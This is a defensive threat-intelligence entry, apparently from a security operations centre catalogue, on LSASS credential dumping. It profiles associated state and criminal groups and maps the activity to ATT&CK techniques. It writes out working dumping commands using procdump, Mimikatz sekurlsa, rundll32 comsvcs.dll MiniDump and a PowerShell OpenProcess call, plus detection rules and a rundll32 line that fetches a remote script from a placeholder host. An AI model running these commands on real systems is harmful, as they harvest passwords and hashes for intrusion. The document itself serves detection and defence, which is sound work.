# Manipulation of credentials stored in LSASS

## Metadata

- **UUID**: `2d0beed6-6520-4114-be1f-24067628e93c`
- **Schema**: `threat::1.0`
- **Version**: `4`
- **Created**: `2023-01-31`
- **Modified**: `2025-10-01`
- **TLP**: clear (`TLP:CLEAR`)
- **Organisation**: EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`)

## References
### Public
- **1**: [https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh994565(v=ws.11)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh994565(v=ws.11))
- **2**: [https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/](https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/)
- **3**: [https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32)
- **4**: [https://www.sentinelone.com/cybersecurity-101/mimikatz/](https://www.sentinelone.com/cybersecurity-101/mimikatz/)
- **5**: [https://learn.microsoft.com/id-id/sysinternals/downloads/procdump](https://learn.microsoft.com/id-id/sysinternals/downloads/procdump)
- **6**: [https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before)
- **7**: [https://www.reliaquest.com/i/blog/credential-dumping-part-1-a-closer-look-at-vulnerabilities-with-windows-authentication-and-credential-management/](https://www.reliaquest.com/i/blog/credential-dumping-part-1-a-closer-look-at-vulnerabilities-with-windows-authentication-and-credential-management/)
- **8**: [https://www.eideon.com/2017-09-09-THL01-Mimikatz/](https://www.eideon.com/2017-09-09-THL01-Mimikatz/)
- **9**: [https://redcanary.com/threat-detection-report/techniques/lsass-memory/](https://redcanary.com/threat-detection-report/techniques/lsass-memory/)
- **10**: [https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90010](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90010)

## Description
Credentials can be stored in the Local Security Authority Subsystem
Service (LSASS) process in memory for use by the account. LSASS stores
credentials in memory on behalf of users with active Windows sessions.
LSASS can store user or system credentials in several different ways: 
Reversibly encrypted plaintext, Kerberos Tickets, NT hashes or LM
hashes. 

The threat actors can harvest these credentials with an administrative
user or SYSTEM. Administrative accounts are used by users to carry out
tasks that require special permissions, such as installing software or
renaming a computer and they need higher administrative privileges. In
the most cases the threat actors are using different tools to manipulate
the credentials in LSASS process in memory, for example: Mimikatz, Cobalt
Strike, Impacket, Metasploit, PowerSploit, Empire, Pwdump, Dumpert and
others.

Mimikatz is a tool that allows an attacker to extract clear text passwords,
hash values, and Kerberos tickets from LSASS. The tool can be used to
retrieve password information for a user account that is currently logged
into a system, or to extract the hashes of all user accounts on a system,
which can then be used to perform offline password cracking.

By manipulating LSASS, an attacker can gain access to sensitive information,
such as passwords and other credentials, and use that information to
compromise the security of a system or network.

For example, on thetarget host threat actors can use procdump:

procdump -ma lsass.exe lsass_dump

Example for a local credential dumping from LSASS memory with Mimikatz
sekurlsa:

sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords

Example for process dumping memory of lsass.exe to obtain credentials.
Threat actors are using dynamic-link libraries (DLLs) like Rundll32 to
manipulate the process in LSASS memory.

rundll32 C:\windows\system32\comsvcs.dll MiniDump lsass.dmp

OR

process == rundll32.exe
&&
command_line_includes ('MiniDump')

Example for a process that access LSASS memory:

process == ('powershell.exe' || 'taskmgr.exe' || 'rundll32.exe' || 'procdump.exe' 
|| 'procexp.exe' || [other native processes that don’t normally access LSASS]) &&
cross_process_handle_to ('lsass.exe')

Threat actors can use PowerShell scripts to request process access to
lsass.exe process (an example for access to PROCESS_ALL_ACCESS – 0x1F0FFF
process):

$Handle = [Uri].Assembly.GetType('Microsoft.Win32.NativeMethods')::OpenProcess(0x1F0FFF, $False, (Get-Process lsass).Id)

If the key value pair in the registry for LSASS is changed to 1, this
is an indicator that the passwords are stored in cleartext in LSASS memory.

Example for a DWORD in the registry: 

HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/SecurityProviders/WDigest/UseLogonCredentia

## Criticality
**Medium** - A Medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.

## Terrain
> **Requires an already compromised Windows endpoint with elevated access
rights to SYSTEM user.

Domains: Enterprise, Public Cloud, Private Cloud
Targets: API Endpoints, Control Server, Remote access, Desktop, Laptop, End-user, System admin, Public-Facing Servers, Web Application Servers
Platforms: Windows, PowerShell**

## Threat Assessment
| Dimension | Assessment | Description |
| --- | --- | --- |
| Severity | Moderate incident | A cyber attack on a small organisation, or which poses a considerable risk to a medium-sized organisation, or preliminary indications of cyber activity against a large organisation or the government. |
| Impact | Nuisance | Small and mostly inconsequential to day to day operations, but noticed. |
| Leverage | Tampering | Threat action intending to maliciously change or modify persistent data, such as records in a database, and the alteration of data in transit between two computers over an open network, such as the Internet. |
| Viability | Likely | Probable (probably) - 55-80% |
| Kill Chain | Credential Access | Techniques resulting in the access of, or control over, system, service or domain credentials. |

## Actors
| Actor | ID | Source | Description |
| --- | --- | --- | --- |
| [[Enterprise] APT28](https://attack.mitre.org/groups/G0007) | `att&ck::G0007` | ('att&ck',) | [APT28](https://attack.mitre.org/groups/G0007) is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.(Citation: NSA/FBI Drovorub August 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) This group has been active since at least 2004.(Citation: DOJ GRU Indictment Jul 2018)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Crowdstrike DNC June 2016)(Citation: FireEye APT28)(Citation: SecureWorks TG-4127)(Citation: FireEye APT28 January 2017)(Citation: GRIZZLY STEPPE JAR)(Citation: Sofacy DealersChoice)(Citation: Palo Alto Sofacy 06-2018)(Citation: Symantec APT28 Oct 2018)(Citation: ESET Zebrocy May 2019)  [APT28](https://attack.mitre.org/groups/G0007) reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election.(Citation: Crowdstrike DNC June 2016) In 2018, the US indicted five GRU Unit 26165 officers associated with [APT28](https://attack.mitre.org/groups/G0007) for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations.(Citation: US District Court Indictment GRU Oct 2018) Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as [Sandworm Team](https://attack.mitre.org/groups/G0034). |
| APT28 | `misp::5b4ee3ea-eee3-4c8e-8323-85ae32658754` | ('misp',) | The Sofacy Group (also known as APT28, Pawn Storm, Fancy Bear and Sednit) is a cyber espionage group believed to have ties to the Russian government. Likely operating since 2007, the group is known to target government, military, and security organizations. It has been characterized as an advanced persistent threat. |
| [[Enterprise] FIN6](https://attack.mitre.org/groups/G0037) | `att&ck::G0037` | ('att&ck',) | [FIN6](https://attack.mitre.org/groups/G0037) is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems in the hospitality and retail sectors.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019) |
| FIN6 | `misp::647894f6-1723-4cba-aba4-0ef0966d5302` | ('misp',) | FIN is a group targeting financial assets including assets able to do financial transaction including PoS. |
| [[Enterprise] Leviathan](https://attack.mitre.org/groups/G0065) | `att&ck::G0065` | ('att&ck',) | [Leviathan](https://attack.mitre.org/groups/G0065) is a Chinese state-sponsored cyber espionage group that has been attributed to the Ministry of State Security's (MSS) Hainan State Security Department and an affiliated front company.(Citation: CISA AA21-200A APT40 July 2021) Active since at least 2009, [Leviathan](https://attack.mitre.org/groups/G0065) has targeted the following sectors: academia, aerospace/aviation, biomedical, defense industrial base, government, healthcare, manufacturing, maritime, and transportation across the US, Canada, Australia, Europe, the Middle East, and Southeast Asia.(Citation: CISA AA21-200A APT40 July 2021)(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)(Citation: CISA Leviathan 2024) |
| APT40 | `misp::5b4b6980-3bc7-11e8-84d6-879aaac37dd9` | ('misp',) | Leviathan is an espionage actor targeting organizations and high-value targets in defense and government. Active since at least 2014, this actor has long-standing interest in maritime industries, naval defense contractors, and associated research institutions in the United States and Western Europe. |
| [[Enterprise] Fox Kitten](https://attack.mitre.org/groups/G0117) | `att&ck::G0117` | ('att&ck',) | [Fox Kitten](https://attack.mitre.org/groups/G0117) is threat actor with a suspected nexus to the Iranian government that has been active since at least 2017 against entities in the Middle East, North Africa, Europe, Australia, and North America. [Fox Kitten](https://attack.mitre.org/groups/G0117) has targeted multiple industrial verticals including oil and gas, technology, government, defense, healthcare, manufacturing, and engineering.(Citation: ClearkSky Fox Kitten February 2020)(Citation: CrowdStrike PIONEER KITTEN August 2020)(Citation: Dragos PARISITE )(Citation: ClearSky Pay2Kitten December 2020) |
| Fox Kitten | `misp::bfb0bc20-5bdf-47ff-b07f-dbd9a3cb9772` | ('misp',) | PIONEER KITTEN is an Iran-based adversary that has been active since at least 2017 and has a suspected nexus to the Iranian government. This adversary appears to be primarily focused on gaining and maintaining access to entities possessing sensitive information of likely intelligence interest to the Iranian government. According to DRAGOS, they also targeted ICS-related entities using known VPN vulnerabilities. They are widely known to use open source penetration testing tools for reconnaissance and to establish encrypted communications. |
| [[Enterprise] MuddyWater](https://attack.mitre.org/groups/G0069) | `att&ck::G0069` | ('att&ck',) | [MuddyWater](https://attack.mitre.org/groups/G0069) is a cyber espionage group assessed to be a subordinate element within Iran's Ministry of Intelligence and Security (MOIS).(Citation: CYBERCOM Iranian Intel Cyber January 2022) Since at least 2017, [MuddyWater](https://attack.mitre.org/groups/G0069) has targeted a range of government and private organizations across sectors, including telecommunications, local government, defense, and oil and natural gas organizations, in the Middle East, Asia, Africa, Europe, and North America.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: Talos MuddyWater Jan 2022) |
| MuddyWater | `misp::a29af069-03c3-4534-b78b-7d1a77ea085b` | ('misp',) | The MuddyWater attacks are primarily against Middle Eastern nations. However, we have also observed attacks against surrounding nations and beyond, including targets in India and the USA. MuddyWater attacks are characterized by the use of a slowly evolving PowerShell-based first stage backdoor we call “POWERSTATS”. Despite broad scrutiny and reports on MuddyWater attacks, the activity continues with only incremental changes to the tools and techniques. |

## ATT&CK Techniques
| Technique | Name | Description |
| --- | --- | --- |
| `T1003.001` | [OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001) | Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).  As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.  For example, on the target host use procdump:  * <code>procdump -ma lsass.exe lsass_dump</code>  Locally, mimikatz can be run using:  * <code>sekurlsa::Minidump lsassdump.dmp</code> * <code>sekurlsa::logonPasswords</code>  Built-in Windows tools such as `comsvcs.dll` can also be used:  * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)  Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)  Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)  The following SSPs can be used to access credentials:  * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package. * Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection) * Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later. * CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection) |
| `T1218.011` | [System Binary Proxy Execution: Rundll32](https://attack.mitre.org/techniques/T1218/011) | Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).  Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.  Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)  Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).  Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) |
| `T1098` | [Account Manipulation](https://attack.mitre.org/techniques/T1098) | Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.   In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078). |
| `T1003` | [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) | Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.  Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well. |
